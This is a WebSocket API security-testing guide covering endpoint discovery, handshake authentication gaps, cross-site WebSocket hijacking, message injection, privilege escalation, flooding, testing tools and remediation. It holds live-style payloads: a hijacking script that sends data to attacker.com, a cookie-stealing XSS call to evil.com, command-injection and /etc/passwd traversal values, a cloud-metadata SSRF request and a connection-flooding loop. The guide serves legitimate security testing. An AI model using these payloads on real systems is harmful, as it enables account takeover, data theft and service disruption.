# WebSocket API Security Testing

## Overview
WebSocket connections provide full-duplex, persistent communication channels between clients and servers. Unlike traditional HTTP request-response patterns, WebSockets maintain long-lived connections that bypass many standard HTTP security controls. This creates unique attack vectors including authentication gaps after the initial handshake, missing message validation, cross-site WebSocket hijacking, injection via message payloads, and denial of service through connection or message flooding.

## Classification
- **CWE:** CWE-287 (Improper Authentication), CWE-346 (Origin Validation Error), CWE-20 (Improper Input Validation), CWE-400 (Uncontrolled Resource Consumption), CWE-79 (Cross-site Scripting)
- **OWASP:** A01:2021 - Broken Access Control, A03:2021 - Injection, A07:2021 - Identification and Authentication Failures
- **CVSS Base:** 5.3 - 9.1 (Medium to Critical)
- **MITRE ATT&CK:** T1190 (Exploit Public-Facing Application), T1557 (Adversary-in-the-Middle)

## Detection Methodology

### 1. WebSocket Endpoint Discovery
Locate WebSocket endpoints in the application:
```
# Common WebSocket paths
ws://target.com/ws
ws://target.com/websocket
ws://target.com/socket.io/?EIO=4&transport=websocket
ws://target.com/cable
ws://target.com/hub
ws://target.com/realtime
ws://target.com/stream
ws://target.com/api/ws
wss://target.com/wss

# Discovery techniques
# 1. Search JavaScript source for WebSocket URLs
#    new WebSocket("ws://...", ...)
#    io.connect("...")
# 2. Monitor network traffic for 101 Switching Protocols
# 3. Check for Socket.IO/SignalR/ActionCable endpoints
# 4. Look for Upgrade headers in HTTP responses
```

### 2. Authentication Testing
WebSocket connections often authenticate only during the handshake:
```bash
# Connect without any authentication
websocat ws://target.com/ws

# Connect with stolen/expired session cookie
websocat -H "Cookie: session=expired_token" ws://target.com/ws

# Test if authentication persists after connection
# 1. Connect with valid auth
# 2. Invalidate the session (logout, change password)
# 3. Send messages on the existing connection
# 4. If messages still processed, auth not re-validated

# Token in URL (exposed in logs, history)
ws://target.com/ws?token=secret_token

# Missing authentication on specific message types
# Authenticate normally, then send admin-level messages
{"type": "admin_action", "action": "delete_user", "userId": 1002}
```

### 3. Cross-Site WebSocket Hijacking (CSWSH)
Test if the server validates the Origin header during handshake:
```html
<!-- Host this on attacker-controlled domain -->
<script>
  var ws = new WebSocket("wss://target.com/ws");
  ws.onopen = function() {
    ws.send(JSON.stringify({type: "get_profile"}));
  };
  ws.onmessage = function(event) {
    // Exfiltrate data to attacker server
    fetch("https://attacker.com/steal?data=" + encodeURIComponent(event.data));
  };
</script>
```

Test variations:
```
# No Origin header
# Null origin
Origin: null

# Subdomain of target
Origin: https://evil.target.com

# Similar domain
Origin: https://target.com.evil.com

# Different scheme
Origin: http://target.com    (HTTP instead of HTTPS)
```

### 4. Message Injection Attacks
Test all message fields for injection vulnerabilities:
```json
// SQL injection via WebSocket message
{"type": "search", "query": "test' OR '1'='1"}
{"type": "search", "query": "test'; DROP TABLE users;--"}

// NoSQL injection
{"type": "find", "filter": {"$gt": ""}}

// XSS via WebSocket (stored in chat, reflected in page)
{"type": "message", "content": "<img src=x onerror=alert(document.cookie)>"}
{"type": "message", "content": "<script>fetch('http://evil.com/'+document.cookie)</script>"}

// Command injection
{"type": "execute", "command": "ls; cat /etc/passwd"}
{"type": "ping", "host": "127.0.0.1; whoami"}

// Path traversal
{"type": "file_read", "path": "../../../etc/passwd"}

// SSRF via WebSocket
{"type": "fetch", "url": "http://169.254.169.254/latest/meta-data/"}

// Template injection
{"type": "render", "template": "{{7*7}}"}
{"type": "render", "template": "${7*7}"}
```

### 5. Authorization and Access Control
```json
// Horizontal privilege escalation
// Subscribe to another user's private channel
{"type": "subscribe", "channel": "user_1002_notifications"}

// Vertical privilege escalation
// Send admin-level messages as regular user
{"type": "admin_broadcast", "message": "System maintenance"}
{"type": "set_role", "userId": 1001, "role": "admin"}

// Channel enumeration
{"type": "subscribe", "channel": "admin"}
{"type": "subscribe", "channel": "internal"}
{"type": "subscribe", "channel": "debug"}
{"type": "subscribe", "channel": "system_logs"}

// Message type enumeration
// Try undocumented message types
{"type": "debug"}
{"type": "admin"}
{"type": "internal_status"}
{"type": "config"}
{"type": "eval"}
```

### 6. Message Validation and DoS
```json
// Oversized messages, malformed JSON, binary frame injection
// Null bytes: {"type": "message", "content": "test\x00admin_command"}
// Integer overflow: {"type": "transfer", "amount": -1}
// Type confusion: {"type": "message", "id": [1,2,3]}   // array instead of int
```
```bash
# Connection flooding
for i in $(seq 1 10000); do websocat ws://target.com/ws & done

# Message flooding, large message DoS, slowloris-style slow sends
# Ping/pong abuse, highly fragmented messages
```

### 7. Protocol-Level Attacks
```
# Attempt WebSocket upgrade on non-WebSocket endpoints (e.g., /api/admin)
# Extension abuse: Sec-WebSocket-Extensions: permessage-deflate
# Subprotocol manipulation: Sec-WebSocket-Protocol: admin, debug, internal
# WebSocket over HTTP/2 (RFC 8441) — test for different security behavior
```

## Tool Usage

### Burp Suite
```
# WebSocket interception and testing
1. Proxy -> WebSockets History (view all WS messages)
2. Right-click message -> Send to Repeater
3. Modify message payload in Repeater
4. Use Intruder with WebSocket messages for fuzzing
5. Use Autorize-style testing for WS authorization

# WebSocket-specific Burp extensions:
# - Socrates (WebSocket testing)
# - WS Message Editor
```

### websocat
```bash
# Install: cargo install websocat

# Connect to WebSocket
websocat ws://target.com/ws

# Connect with custom headers
websocat -H "Cookie: session=token" -H "Origin: https://evil.com" ws://target.com/ws

# Send message and receive response
echo '{"type":"ping"}' | websocat ws://target.com/ws

# Interactive mode with auth
websocat -H "Authorization: Bearer TOKEN" wss://target.com/ws
```

### wscat
```bash
# Install: npm install -g wscat

# Connect
wscat -c ws://target.com/ws

# With headers
wscat -c ws://target.com/ws -H "Cookie: session=abc"

# With subprotocol
wscat -c ws://target.com/ws -s "graphql-ws"
```

### OWASP ZAP
```
# Proxy through ZAP, navigate to trigger WS connections
# Use WebSocket tab for inspection and ZAP Fuzzer for message fuzzing
```

## Remediation
1. **Origin validation** -- strictly validate the Origin header during WebSocket handshake; reject connections from unauthorized origins
2. **Authentication on every message** -- do not rely solely on handshake authentication; validate tokens or session state with each message or periodically
3. **Message schema validation** -- define and enforce strict schemas for all message types; reject malformed or unexpected messages
4. **Input sanitization** -- treat all WebSocket message content as untrusted; apply context-appropriate encoding and validation
5. **Rate limiting** -- implement per-connection and per-user message rate limits; enforce maximum connection counts per IP
6. **Message size limits** -- enforce maximum frame and message sizes at the server level
7. **Use WSS (TLS)** -- always use wss:// in production; never transmit WebSocket data over unencrypted channels
8. **Connection timeouts** -- implement idle connection timeouts; enforce maximum connection duration
9. **Authorization per message type** -- check user permissions for each message type, not just at connection time
10. **CSRF protection** -- use custom headers or tokens that are validated during the handshake to prevent cross-site WebSocket hijacking

## Evidence Collection
- Cross-site WebSocket hijacking proof-of-concept HTML showing data exfiltration
- Origin header bypass demonstrating accepted malicious origins
- Authentication persistence test results (messages accepted after session invalidation)
- Injection payloads that succeeded within WebSocket messages
- Authorization bypass examples with request/response message pairs
- Connection and message flooding results with server behavior metrics
- Discovered undocumented message types and channels
- WebSocket handshake headers showing missing security controls
